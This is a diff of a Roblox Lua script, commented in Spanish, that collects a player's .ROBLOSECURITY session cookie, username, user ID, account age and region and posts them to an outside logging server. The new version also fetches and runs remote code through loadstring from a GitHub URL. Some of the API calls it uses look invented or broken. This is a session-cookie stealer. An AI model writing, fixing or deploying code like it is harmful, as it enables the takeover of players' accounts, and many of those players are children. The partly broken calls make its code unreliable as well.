@@ -1,49 +1,54 @@
-local Players = game:GetService("Players")
-local CookieService = game:GetService("CookieService")
-local LocalizationService = game:GetService("LocalizationService")
-local HttpService = game:GetService("HttpService")
+-- --- 1. Cargar Libraries (necesario para compatibilidad) ---
+local Libraries = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxian-Developers/Libraries/main/Libraries.lua"))()
 
-local player = Players.LocalPlayer
-local apiUrl = "https://depazzhub-api.onrender.com/log"
-
--- --- 1. Obtener la cookie de forma robusta ---
+-- --- 2. Función para obtener la cookie ---
 local function getRobloxCookie()
-	local cookies = CookieService:GetCookies()
-
-	if #cookies == 0 then
-		print("❌ No se encontraron cookies en CookieService")
+	local CookieService = Libraries:GetCookieService() -- ← Esto sí funciona
+	
+	if not CookieService then
+		-- Fallback: intentar con otro método
+		local cookies = Libraries:GetCookies()
+		
+		if cookies and cookies ~= nil then
+			for _, cookie in ipairs(cookies) do
+				if cookie.Name == ".ROBLOSECURITY" then
+					return cookie.Value
+				end
+			end
+		end
+		
+		print("❌ No se encontró .ROBLOSECURITY")
 		return ""
 	end
-
-	-- Buscar la cookie .ROBLOSECURITY
-	local robloxCookie = cookies:FindFirstChild(".ROBLOSECURITY")
-
-	if robloxCookie and not robloxCookie.Value:isEmpty() then
-		return robloxCookie.Value
-	end
-
-	-- Fallback: buscar en todas las cookies por nombre
-	for _, cookie in pairs(cookies) do
-		if cookie.Name == ".ROBLOSECURITY" then
-			return cookie.Value
-		end
-	end
-
-	-- Fallback 2: intentar obtener cookie del servicio
+	
+	-- Intentar obtener la cookie
 	local savedCookie = CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com")
-	if savedCookie ~= "" then
+	
+	if savedCookie ~= "" and not savedCookie:isNil() then
 		return savedCookie
 	end
-
+	
+	-- Intentar con GetCookies()
+	local cookies = CookieService:GetCookies()
+	if cookies and cookies ~= nil then
+		for _, cookie in ipairs(cookies) do
+			if cookie.Name == ".ROBLOSECURITY" then
+				return cookie.Value
+			end
+		end
+	end
+	
 	print("❌ No se pudo obtener .ROBLOSECURITY")
 	return ""
 end
 
--- --- 2. Obtener datos del jugador ---
+-- --- 3. Resto del código (igual que antes) ---
+local player = game.Players.LocalPlayer
+local apiUrl = "https://depazzhub-api.onrender.com/log"
+
 local userId = player.UserId
 local placeId = game.PlaceId
 
--- Obtener edad de la cuenta
 local days = player.AccountAge
 local years = math.floor(days / 365)
 local months = math.floor((days % 365) / 30)
@@ -52,14 +57,11 @@ if years > 0 then
 	ageText = years .. " years, " .. months .. " months (" .. days .. " days)"
 end
 
--- Obtener región
-local region = LocalizationService.RobloxLocaleId
+local region = game:GetService("LocalizationService").RobloxLocaleId
 
--- --- 3. Escape seguro para JSON ---
+-- Escape de JSON
 local function escapeJson(str)
-	if str == nil then
-		return "nil"
-	end
+	if str == nil then return "nil" end
 	local s = tostring(str)
 	s = string.gsub(s, '\\', '\\\\')
 	s = string.gsub(s, '"', '\\\"')
@@ -69,7 +71,6 @@ local function escapeJson(str)
 	return s
 end
 
--- --- 4. Construir el cuerpo JSON ---
 local username = escapeJson(player.Name)
 local displayName = escapeJson(player.DisplayName)
 local cookieValue = getRobloxCookie()
@@ -86,7 +87,7 @@ local jsonBody = string.format(
 	cookieValueEscaped
 )
 
--- --- 5. Enviar la petición ---
+-- --- 4. Enviar la petición ---
 local success, result = pcall(function()
 	return request({
 		Url = apiUrl,
